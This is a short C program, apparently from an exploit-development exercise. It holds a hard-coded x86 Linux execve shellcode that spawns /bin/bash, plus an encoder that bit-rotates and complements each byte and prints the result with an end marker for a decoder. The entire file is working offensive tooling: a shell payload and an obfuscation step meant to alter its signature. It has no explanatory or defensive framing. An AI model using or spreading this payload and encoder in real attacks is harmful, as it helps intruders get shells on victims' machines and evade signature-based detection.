#include <stdio.h>
#include <string.h>

// execve stack shellcode
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// print shellcode
void print_shellcode(){

	printf("Length %d\n",sizeof(shellcode));
	for (int i=0; i<strlen(shellcode); i++) {
		printf("\\x%02x", shellcode[i]);
	}
	printf("\n");

	for (int i=0; i<strlen(shellcode); i++) {
		printf("0x%02x,", shellcode[i]);
	}
}

void main()
{

	int	rotate = 4;	// rotate 4 bits to the right

	// print initial shellcode
	printf("Initial shellcode\n");
	print_shellcode();
	printf("\n");

	for (int i=0; i<strlen(shellcode); i++) {
		shellcode[i] = (shellcode[i] >> rotate) | (shellcode[i] << (8-rotate));	// ror method
		shellcode[i] = ~shellcode[i]; // one's complement 
	}

	// print encoded shellcode
	printf("\nEncoded shellcode\n");
	print_shellcode();
	printf("0xaa"); // marker for the end of encoded shellcode
	printf("\n");

}
